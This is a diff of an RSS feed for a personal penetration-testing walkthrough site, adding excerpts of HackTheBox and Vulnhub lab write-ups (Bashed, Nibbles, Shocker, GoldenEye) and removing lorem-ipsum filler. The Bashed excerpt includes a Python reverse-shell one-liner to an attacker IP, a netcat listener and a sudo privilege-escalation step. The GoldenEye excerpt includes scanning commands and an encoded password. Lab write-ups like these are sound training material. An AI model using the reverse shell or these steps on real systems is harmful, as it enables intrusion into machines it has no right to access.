@@ -5,25 +5,29 @@
     <link>https://xf3n9.github.io/</link>
     <description>Recent content in Introduction on xf3n9 secwalk</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Fri, 31 Mar 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://xf3n9.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 02 Apr 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://xf3n9.github.io/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Bashed</title>
       <link>https://xf3n9.github.io/docs/hackthebox/bashed/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <pubDate>Sun, 02 Apr 2023 00:00:00 +0000</pubDate>
       
       <guid>https://xf3n9.github.io/docs/hackthebox/bashed/</guid>
-      <description>bashed#</description>
+      <description>HTB: Bashed#Recon#http://10.10.10.68 有一篇关于phpbash的文章
+gobuster -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt /dev页面：
+点击phpbash.php给出一个页面shell，即phpbash
+Phpbash#尝试进入/home目录下的用户目录，成功找到user.txt
+Shell Upgrade#在phpbash中准备：
+python -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.10.14.157&amp;#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39; 在kali中监听：
+nc -nvlp 4444# connect to local from remotepython -c &amp;#39;import pty;pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;# pty shell PrivEsc#sudo -lUser www-data may run the following commands on bashed:(scriptmanager : scriptmanager) NOPASSWD: ALL# switch user to scriptmanagersudo -u scriptmanager /bin/bashls -l /scripts# autorun py gen txttest.</description>
     </item>
     
     <item>
-      <title>Nibbles</title>
-      <link>https://xf3n9.github.io/docs/hackthebox/nibbles/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <title>Brainfuck</title>
+      <link>https://xf3n9.github.io/docs/hackthebox/brainfuck/</link>
+      <pubDate>Sun, 02 Apr 2023 00:00:00 +0000</pubDate>
       
-      <guid>https://xf3n9.github.io/docs/hackthebox/nibbles/</guid>
-      <description>Nibbles is one of the easier boxes on HTB. It hosts a vulnerable instance of nibbleblog. There’s a Metasploit exploit for it, but it’s also easy to do without MSF, so I’ll show both. The privesc involves abusing sudo on a file that is world-writable.
-nmap#An initial nmap scan showed only web/http (80) and ssh (22):
-$ nmap -sV -sC -oA nmap/initial 10.10.10.75 Site - port 80 recon#web root#The root page simply returns a “hello world” message</description>
+      <guid>https://xf3n9.github.io/docs/hackthebox/brainfuck/</guid>
+      <description>HTB: Brainfuck#</description>
     </item>
     
     <item>
@@ -32,8 +36,18 @@ $ nmap -sV -sC -oA nmap/initial 10.10.10.75 Site - port 80 recon#web root#Th
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://xf3n9.github.io/docs/hackthebox/inject/</guid>
-      <description>Caput vino delphine in tamen vias#Cognita laeva illo fracta#Lorem markdownum pavent auras, surgit nunc cingentibus libet Laomedonque que est. Pastor An arbor filia foedat, ne fugit aliter, per. Helicona illas et callida neptem est Oresitrophos caput, dentibus est venit. Tenet reddite famuli praesentem fortibus, quaeque vis foret si frondes gelidos gravidae circumtulit inpulit armenta nativum.
-Te at cruciabere vides rubentis manebo Maturuit in praetemptat ruborem ignara postquam habitasse Subitarum supplevit quoque fontesque venabula spretis modo Montis tot est mali quasque gravis Quinquennem domus arsit ipse Pellem turis pugnabant locavit Natus quaerere#Pectora et sine mulcere, coniuge dum tincta incurvae.</description>
+      <description>HTB: Inject#</description>
+    </item>
+    
+    <item>
+      <title>Nibbles</title>
+      <link>https://xf3n9.github.io/docs/hackthebox/nibbles/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://xf3n9.github.io/docs/hackthebox/nibbles/</guid>
+      <description>HTB: Nibbles#Nibbles is one of the easier boxes on HTB. It hosts a vulnerable instance of nibbleblog. There’s a Metasploit exploit for it, but it’s also easy to do without MSF, so I’ll show both. The privesc involves abusing sudo on a file that is world-writable.
+nmap#An initial nmap scan showed only web/http (80) and ssh (22):
+$ nmap -sV -sC -oA nmap/initial 10.10.10.75 Site - port 80 recon#web root#The root page simply returns a “hello world” message</description>
     </item>
     
     <item>
@@ -42,18 +56,17 @@ Te at cruciabere vides rubentis manebo Maturuit in praetemptat ruborem ignara po
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://xf3n9.github.io/docs/hackthebox/shocker/</guid>
-      <description>HTB:Shocker#The name Shocker gives away pretty quickly what I’ll need to do on this box. There were a couple things to look out for along the way.
+      <description>HTB: Shocker#The name Shocker gives away pretty quickly what I’ll need to do on this box. There were a couple things to look out for along the way.
 be careful when directory brute forcing, as the server is misconfigured in that the cgi-bin directory doesn’t show up without a trailing slash. This means that tools like gobuster and feroxbuster miss it in their default state. I’ll show both manually exploiting ShellShock and using the nmap script to identify it is vulnerable.</description>
     </item>
     
     <item>
-      <title>Brainfuck</title>
-      <link>https://xf3n9.github.io/docs/hackthebox/brainfuck/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <title>Golden-Eye</title>
+      <link>https://xf3n9.github.io/docs/vulnhub/golden-eye/</link>
+      <pubDate>Sun, 02 Apr 2023 00:00:00 +0000</pubDate>
       
-      <guid>https://xf3n9.github.io/docs/hackthebox/brainfuck/</guid>
-      <description>At me ipso nepotibus nunc celebratior genus#Tanto oblite#Lorem markdownum pectora novis patenti igne sua opus aurae feras materiaque illic demersit imago et aristas questaque posset. Vomit quoque suo inhaesuro clara. Esse cumque, per referri triste. Ut exponit solisque communis in tendens vincetis agisque iamque huic bene ante vetat omina Thebae rates. Aeacus servat admonitu concidit, ad resimas vultus et rugas vultu dignamque Siphnon.
-Quam iugulum regia simulacra, plus meruit humo pecorumque haesit, ab discedunt dixit: ritu pharetramque.</description>
+      <guid>https://xf3n9.github.io/docs/vulnhub/golden-eye/</guid>
+      <description>Vulnhub: GoldenEye#Recon#nmap## 主机存活扫描：nmap -sn 10.10.8.0/24# 全端口扫描：nmap --min-rate 10000 -Pn -p- 10.10.8.152PORT STATE SERVICE25/tcp open smtp80/tcp open http55006/tcp open unknown55007/tcp open unknown# 端口服务扫描：nmap -A -sV -T5 10.10.8.152 Web 80#1) 访问80端口，提示Naviagate to /sev-home/ to login// 新标签页打开 http://10.10.8.152/sev-home 2) F12开发者工具，看到terminal.js文件，点击查看 // 获得两个用户名：Boris Natalya// 一个encoded p@ssword：&amp;amp;#73;&amp;amp;#110;&amp;amp;#118;&amp;amp;#105;&amp;amp;#110;&amp;amp;#99;&amp;amp;#105;&amp;amp;#98;&amp;amp;#108;&amp;amp;#101;&amp;amp;#72;&amp;amp;#97;&amp;amp;#99;&amp;amp;#107;&amp;amp;#51;&amp;amp;#114;3) URL encode解码工具：// Burpsuite--Decoder--Decode as HTML获得密码：InvincibleHack3r Login</description>
     </item>
     
     <item>
@@ -72,16 +85,6 @@ DTD，文档类型定义，英文全称：Document Type Definition，应该是�
 漏洞原理：通过向Server提交指定的XML实体内容请求，服务器解析实体内容并进行响应所产生的漏洞。
 现状：目前多数语言默认禁止XML函数解析外部实体，此后漏洞因此得以避免。以PHP为例，libxml用来解析XML，但在PHP&amp;gt;=2.9.0的版本中已默认禁止解析外部实体。
 模拟XXE漏洞，一般通过手动指定libxml_noent选项开启外部实体解析。</description>
-    </item>
-    
-    <item>
-      <title></title>
-      <link>https://xf3n9.github.io/docs/vulnhub/golden-eye/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://xf3n9.github.io/docs/vulnhub/golden-eye/</guid>
-      <description>GoldenEye#Nefas discordemque domino montes numen tum humili nexilibusque exit, Iove. Quae miror esse, scelerisque Melaneus viribus. Miseri laurus. Hoc est proposita me ante aliquid, aura inponere candidioribus quidque accendit bella, sumpta. Intravit quam erat figentem hunc, motus de fontes parvo tempestate.
-iscsi_virus = pitch(json_in_on(eupViral),northbridge_services_troubleshooting, personal(firmware_rw.trash_rw_crm.device(interactive_gopher_personal,software, -1), megabit, ergonomicsSoftware(cmyk_usb_panel,mips_whitelist_duplex, cpa)));if (5) {managementNetwork += dma - boolean;kilohertz_token = 2;honeypot_affiliate_ergonomics = fiber;}mouseNorthbridge = byte(nybble_xmp_modem.</description>
     </item>
     
   </channel>
